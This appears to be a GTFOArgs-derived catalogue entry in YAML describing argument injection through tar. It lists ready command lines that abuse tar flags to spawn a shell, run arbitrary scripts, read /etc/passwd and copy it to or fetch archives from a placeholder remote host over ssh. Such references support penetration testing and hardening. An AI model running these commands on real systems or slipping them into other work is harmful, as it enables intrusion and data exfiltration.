---
trust_level: community
id: argument-injection-tar
namespace: argument:injection:tar
name: tar
description: Argument injection via tar
version: 1.0.0
capabilities:
- security.execution.command
- network.transfer.upload
- network.transfer.download
- system.file.read
platforms:
- cross-platform
techniques:
- execution
- exfiltration
- discovery
execution:
  template: tar
  sandbox: execFile
  timeout_seconds: 30
  shell: false
examples:
- description: The --to-command is normally used to pipe extracted files to a command.
    This can be used to run arbitrary commands on a host. The file must be a valid
    archive file.
  command: 'tar xf /tmp/valid.tar --to-command=''/bin/sh -c "sh <&2 1>&2"'' '
- description: Similar to the above, but at a previous stage in the extraction. A
    valid archive is not required. This functionality can be abused in various ways
    for file-read and file-write (see below).
  command: 'tar xf /dev/null --use-compress-program=''/bin/sh -c "sh <&2 1>&2"'' '
- description: GNU tar specifc. The -F / --info-script= / --new-volume-script= arguments
    will run a command at volume rotation. Other flags used are to force frequent
    rotation.
  command: 'tar cf /dev/null --record-size=512 -L1 -F''/bin/sh -c "sh <&2 1>&2"''
    /tmp/ '
- description: During archive creation, `--checkpoint` and `--checkpoint-action` can
    execute arbitrary commands. Requires injecting two arguments and a positional
    argument.
  command: 'tar ''--checkpoint=1'' ''--checkpoint-action=exec="sh shell.sh"'' '
- description: This only works for GNU tar. Create tar archive and send it via SSH
    to a remote location. The attacker box must have the `rmt` utility installed (it
    should be present by default in Debian-like distributions).
  command: 'tar cvf remote_user@remote_host.com:/tmp/remote_file.tar /etc/passwd --rsh-command=/bin/ssh '
- description: GNU tar has remote archive capabilities, which can be used to download
    and extract remote archives. The remote machine should have the `rmt` utility
    installed and configured.
  command: 'tar xvf remote_user@remote_host.com:/tmp/remote_file --rsh-command=/bin/ssh '
- description: The --use-compress-program flag can be abused to read files.
  command: 'tar xf /etc/passwd --use-compress-program=''/bin/sh -c "echo hello > /tmp/file"'' '
references:
- label: GTFOArgs
  url: https://gtfoargs.github.io/gtfoargs/tar/
features:
- compression
- file-system
- local
- network-intensive
- pipes-stdin
- stealth
---

# tar

GTFOArgs entry for tar. This binary can be used to inject arguments for execution, file operations, or other capabilities.
